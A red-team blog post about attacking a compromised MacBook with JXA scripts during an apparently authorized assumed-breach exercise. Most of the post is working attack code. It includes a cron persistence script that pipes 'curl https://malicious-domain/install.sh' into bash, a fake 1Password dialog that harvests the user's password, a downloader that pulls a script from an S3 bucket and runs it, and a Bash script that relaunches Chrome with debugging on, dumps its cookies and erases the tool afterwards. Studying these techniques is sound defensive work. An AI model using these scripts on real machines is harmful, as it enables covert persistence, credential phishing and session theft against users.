---
title: "Pentesting macOS"
author:
  name: Miguel Guerrero
  link: https://mikemighthack.github.io/blog
date: 2025-01-30 18:00:00 +0105
categories: [masOS, Red Team]
tags: [RT]
math: true
mermaid: true
image:
  src: /assets/images/tutorials/Macos/header.png
---

## Scenario
The other day, I participated in an assumed compromise scenario where we simulated a security breach on an employee's MacBook. In this exercise, we executed a payload without the user's knowledge, which established a connection to our C2— and that's where the fun began.

Since I didn’t have much experience with macOS devices, I started researching and came across JXA (JavaScript for Automation) on macOS.

## JXA (JavaScript for Automation)
JXA (JavaScript for Automation) is a macOS feature that allows automation using JavaScript instead of AppleScript. It provides deep system access, enabling users to interact with applications, execute shell commands, and manipulate files. While useful for automation, it also presents security risks.

Since JXA is built into macOS, attackers can use it stealthily without needing additional downloads. Some key attack vectors include:

- Fileless Malware – JXA scripts can run in memory, evading traditional detection.
- Bypassing Security Controls – Legitimate Apple-signed scripts can slip past antivirus solutions.
- Credential Theft – Attackers can interact with macOS Keychain or capture keystrokes.
- Persistence – Scripts can modify system settings to ensure continued execution.
- C2 Communication – JXA enables remote command execution and data exfiltration.

## JXA Cron Job for Persistence 
While researching ways to achieve persistence on the victim's machine, I came across this repository: [PersistentJXA](https://github.com/D00MFist/PersistentJXA).

This repository contains multiple JavaScript scripts implementing different persistence techniques for macOS.

In my case, I used the Persistence using CronJobs method. I modified the script to fit my needs, and the final result was as follows:

```js
ObjC.import('Foundation')
ObjC.import('stdlib')
var currentApp = Application.currentApplication();
currentApp.includeStandardAdditions = true;

var userHome = $.getenv('HOME')

var output = ""
try{
//Write cronJobaction to hidden script
var cronJobaction = 'curl https://malicious-domain/install.sh | bash'
var cronFilepath = userHome + "/Public/Drop\ Box/.share.sh"
function writeTextToFile(text, file, overwriteExistingContent) {
        var fileString = file.toString()
        var openedFile = currentApp.openForAccess(Path(fileString), { writePermission: true })
        if (overwriteExistingContent) {
            currentApp.setEof(openedFile, { to: 0 })
        }
        currentApp.write(text, { to: openedFile, startingAt: currentApp.getEof(openedFile) })
        currentApp.closeAccess(openedFile)
}
writeTextToFile(cronJobaction, cronFilepath, true)
        
	function chmod(value, path) {
        let a = $({NSFilePosixPermissions:value})
        let p = $(path).stringByStandardizingPath
        let e = $()
        let r = $.NSFileManager.defaultManager
                .setAttributesOfItemAtPathError(a, p, e)
        return r
    }     

//Write cronjob change to allow execution
var cronTask =  `echo "$(echo '0 */4 * * * cd $HOME/Public/Drop\\ Box/ && ./.share.sh' ; crontab -l)" | crontab - `
      
currentApp.doShellScript(cronTask)
chmod(0o755,cronFilepath)

output += "CronJob Persistence intalled at " + cronFilepath 

}catch(error){
       output += error.toString()
		}
```
You can test the script using: `osascript script.js`

The previous script creates a hidden file in the directory userHome + "/Public/Drop\ Box/.share.sh". In this case, the content of this hidden file is a curl request to a server controlled by the attacker with a pipe to execute it with bash. This action executes the malicious payload that will generate a new connection to the C2.
Next, we can see in the cronTask variable the line that will be added to cron, which in this case is the execution of the hidden file every 4 hours.

Interesting, right? Well, this functionality has allowed me to carry out other tasks aside from persistence, as I will show you next.

## Kindly request the credentials
During the discovery phase, I was able to confirm that the user was using 1Password for password management. So, I thought about kindly asking for them with the following script:

```js
ObjC.import('Foundation')
var currentApp = Application.currentApplication();
currentApp.includeStandardAdditions = true;

let config = [];
var output = "";
let passwordicon = "/Applications/1Password.app/Contents/Resources/icon.icns";
let passwordIconexistsCheck = $.NSFileManager.alloc.init.fileExistsAtPathIsDirectory(passwordicon,"")
if (passwordIconexistsCheck == true){
  var icon = passwordicon;
  var title = "Authentication Required";
  var text = "Authenticate to unlock 1Password";
} else {
    var icon = "/System/Library/PrivateFrameworks/PreferencePanesSupport.framework/PlugIns/AdvertisingExtension.appex/Contents/Resources/icon.icns";
    var title = "An Application Needs an Update to Continue";
    var text = "An Application Needs an Update to Continue";}

	if(config.hasOwnProperty("title") && config['title'] !== ""){title = config['title'];}
	if(config.hasOwnProperty("icon") && config['icon'] !== ""){icon = config['icon'];}
	if(config.hasOwnProperty("text") && config['text'] !== ""){text = config['text'];}

		var contextAppString = currentApp.systemAttribute('__CFBundleIdentifier').toString()
		var contextApp = Application(contextAppString)
		contextApp.includeStandardAdditions = true;
		var prompt = contextApp.displayDialog(text, {
			defaultAnswer: "",
			buttons: ['OK', 'Cancel'],
			defaultButton: 'OK',
			cancelButton: 'Cancel',
			withTitle: title,
			withIcon: Path(icon),
			hiddenAnswer: true
    });
   
    var promptResults = prompt.textReturned
    promptResults;
```
The previous script will search for the 1Password icon and trigger a pop-up window asking the user for credentials to unlock 1Password, as shown below:

![image-center]({{ site.url }}{{ site.baseurl }}\assets\images\tutorials\Macos\1password.jpg){: .align-center}


## Obtaining User's cookies

While researching other ways to laterally move, I came across this [post](https://mango.pdf.zone/stealing-chrome-cookies-without-a-password/). It essentially discusses how it's possible to steal Chrome browser cookies in plain text without needing to know the user's password.

To achieve this, the following actions are taken:
- Download the websocat binary for Mac.
- Open the Chrome browser in debug mode.
- Retrieve the debug URL.
- Using websocat, make a request to the debugging URL with the method Storage.getCookies. This returns a JSON with the user's cookies in plain text.

Since I didn't have direct command execution on the victim machine, what I did was host a Bash script in an AWS S3 bucket and use a JXA script to make a request to the S3 bucket and execute the script. In this case, the script would write the cookies to /tmp for later downloading.

JXA script:
```js
ObjC.import('Foundation')
ObjC.import('stdlib')
var currentApp = Application.currentApplication();
currentApp.includeStandardAdditions = true;

try{
        var output = "";
        var task =  `curl https://s3-bucket/chromeUpdate.sh | bash`   
        currentApp.doShellScript(task)
        output += "Executed task"
        output;
}

catch(error){
       output += error.toString()
	}
```

Bash script:
```bash
#! /bin/bash

# Download websocat from github to make the websocket request.
WEBSOCAT_URL="https://github.com/vi/websocat/releases/download/v1.5.0/websocat_mac"
CHROME="/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
USER_DATA_DIR="/Users/fakeUser/Library/Application Support/Google/Chrome/Default"
WEBSOCAT_PATH="$USER_DATA_DIR/websocat"
COOKIE_PATH="$USER_DATA_DIR/Cookies"

# Download websocat
curl -sL "$WEBSOCAT_URL" -o "$WEBSOCAT_PATH"
chmod +x "$WEBSOCAT_PATH"

# Kill Chrome, and wait for the process to terminate.
pkill Chrome 2>&1 >/dev/null && while pgrep Chrome >/dev/null;
    do false;
done;

# Start a new Chrome with  remote debugging enabled, restoring the previous session.
"$CHROME" --user-data-dir="$USER_DATA_DIR" --remote-debugging-port=9222 --crash-dumps-dir="$USER_DATA_DIR" --restore-last-session 2>/dev/null 1>/dev/null &

# Wait for Remote Debugging to be available
while true; do
    curl -s 127.0.0.1:9222/json 2>&1 > /dev/null && break;
done;


# Make the websocket request and print the cookies to stdout.
while true; do
    echo '{"id": 1, "method": "Storage.getCookies"}' | "$WEBSOCAT_PATH" -n1  $(curl -sg http://127.0.0.1:9222/json | grep webSocketDebuggerUrl | cut -d'"' -f4 | head -1) >> /tmp/ythtmp 2>/dev/null && break
done;

# Delete websocat, leaving no trace, like a leaf on the wind.
rm "$WEBSOCAT_PATH"
```

After executing the JS script, I was able to see the user's browser cookies in a file within the /tmp folder.

### Resources & credits
- https://mango.pdf.zone/stealing-chrome-cookies-without-a-password/
- https://github.com/D00MFist/PersistentJXA
- https://github.com/defaultnamehere/cookie_crimes
- https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e
